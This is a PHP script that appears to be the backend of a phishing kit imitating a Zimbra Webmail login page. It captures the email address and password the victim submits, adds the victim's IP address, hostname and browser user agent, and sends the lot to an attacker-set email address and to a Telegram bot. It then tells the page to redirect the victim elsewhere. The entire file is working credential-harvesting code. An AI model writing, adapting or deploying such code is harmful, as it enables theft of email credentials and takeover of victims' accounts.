<?php
require_once 'email.php';
require_once 'telegram.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response to the frontend
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Ensure inputs are valid
if (!empty($email) && !empty($password)) {
    try {
        // Get client information
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $hostname = gethostbyaddr($ip) ?: 'Unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

        // Build message using heredoc for better readability
        $message = <<<EOT
|-----------|Zimbra Webmail|------------|
Email: {$email}
Password: {$password}
|-----------------------|
Client IP: {$ip}
GeoIP: http://www.geoiptool.com/?IP={$ip}
User Agent: {$userAgent}
|-----------------------|
EOT;

        // Email configuration
        $subject = "Login: {$ip}";
        $Receive_email = getenv('RECEIVER_EMAIL'); // Get receiver email from environment

        if (!$Receive_email || !filter_var($Receive_email, FILTER_VALIDATE_EMAIL)) {
            error_log("Receiver email is not configured or invalid.");
            sendJsonResponse(false, "Backend Configuration: Receiver email invalid.");
        }

        // Send email
        if (!mail($Receive_email, $subject, $message)) {
            error_log("Failed to send email to {$Receive_email}");
            sendJsonResponse(false, "Failed to send email.");
        }

        // Telegram notification
        $botToken = getenv('TELEGRAM_BOT_TOKEN');
        $id = getenv('TELEGRAM_CHAT_ID');

        if (!$botToken || !$id) {
            error_log("Telegram bot token or chat ID is missing.");
            sendJsonResponse(false, "Backend Configuration: Telegram not configured.");
        }

        $encodedMessage = urlencode($message);
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendmessage?chat_id={$id}&text={$encodedMessage}";
        
        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $telegramUrl,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10 // Add timeout to prevent hanging
        ]);

        $result = curl_exec($curl);
        
        if ($result && !curl_errno($curl)) {
            curl_close($curl);
            sendJsonResponse(true, 'Notification sent successfully', "https://dashboard.example.com");
        } else {
            error_log("Telegram API error: " . curl_error($curl));
            curl_close($curl);
            sendJsonResponse(false, "Failed to send Telegram notification.");
        }
    } catch (Exception $e) {
        error_log("General error in next.php: " . $e->getMessage());
        sendJsonResponse(false, "An exception occurred: {$e->getMessage()}");
    }
} else {
    sendJsonResponse(false, "Invalid input: Email or Password missing.");
}
